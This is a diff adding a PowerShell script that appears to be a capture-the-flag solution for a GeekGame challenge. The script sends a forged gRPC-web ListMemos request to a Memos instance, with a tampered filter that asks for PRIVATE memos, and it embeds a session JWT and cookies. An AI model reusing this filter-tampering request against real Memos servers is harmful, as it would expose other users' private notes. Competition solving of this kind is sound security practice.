@@ -1,0 +1,29 @@
+$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
+$session.Cookies.Add((New-Object System.Net.Cookie("anticheat_canary", "btdagalphx", "/", ".geekgame.pku.edu.cn")))
+$session.Cookies.Add((New-Object System.Net.Cookie("memos.access-token", "eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiIiwiaXNzIjoibWVtb3MiLCJzdWIiOiIyIiwiYXVkIjpbInVzZXIuYWNjZXNzLXRva2VuIl0sImV4cCI6NDg4MjY3Nzc1MiwiaWF0IjoxNzI5MDc3NzUyfQ.VxOW-4ZVA2KZONVh98PNHChXcQM9JpXhkuDCTEs9Lj4", "/", "prob09-h9n3fvos.geekgame.pku.edu.cn")))
+$response = Invoke-WebRequest -UseBasicParsing -Uri "https://prob09-h9n3fvos.geekgame.pku.edu.cn/memos.api.v1.MemoService/ListMemos" `
+-Method "POST" `
+-WebSession $session `
+-Headers @{
+"authority"="prob09-h9n3fvos.geekgame.pku.edu.cn"
+  "method"="POST"
+  "path"="/memos.api.v1.MemoService/ListMemos"
+  "scheme"="https"
+  "accept"="*/*"
+  "accept-encoding"="gzip, deflate, br, zstd"
+  "accept-language"="zh-CN,zh;q=0.9"
+  "origin"="https://prob09-h9n3fvos.geekgame.pku.edu.cn"
+  "priority"="u=1, i"
+  "referer"="https://prob09-h9n3fvos.geekgame.pku.edu.cn/explore"
+  "sec-ch-ua"="`"Google Chrome`";v=`"129`", `"Not=A?Brand`";v=`"8`", `"Chromium`";v=`"129`""
+  "sec-ch-ua-mobile"="?0"
+  "sec-ch-ua-platform"="`"Windows`""
+  "sec-fetch-dest"="empty"
+  "sec-fetch-mode"="cors"
+  "sec-fetch-site"="same-origin"
+  "x-grpc-web"="1"
+} `
+-ContentType "application/grpc-web+proto" `
+-Body ([System.Text.Encoding]::UTF8.GetBytes("$([char]0)$([char]0)$([char]0)$([char]0)k$([char]8)$([char]16)$([char]26)grow_status == `"NORMAL`" && visibilities == ['PUBLIC', 'PROTECTED', 'PRIVATE'] && content_search == [`"C`"]"))
+Write-Host $response
